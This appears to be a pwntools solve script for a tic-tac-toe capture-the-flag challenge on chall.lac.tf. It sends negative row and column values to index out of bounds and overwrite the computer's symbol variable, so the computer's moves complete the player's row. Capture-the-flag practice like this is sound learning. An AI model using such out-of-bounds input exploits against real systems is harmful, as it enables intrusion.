from pwn import *

# r = process("./chall")
r = remote("chall.lac.tf", "30001")

# Overwrite computer variable: (row-1)*3+(col-1) = -23 → row=-7, col=2
r.sendlineafter(b"row #(1-3): ",    b"-7")
r.sendlineafter(b"column #(1-3): ", b"2")

# Play a normal move; AI now also places 'X' and completes a row for us
r.sendlineafter(b"row #(1-3): ",    b"1")
r.sendlineafter(b"column #(1-3): ", b"1")

r.interactive()
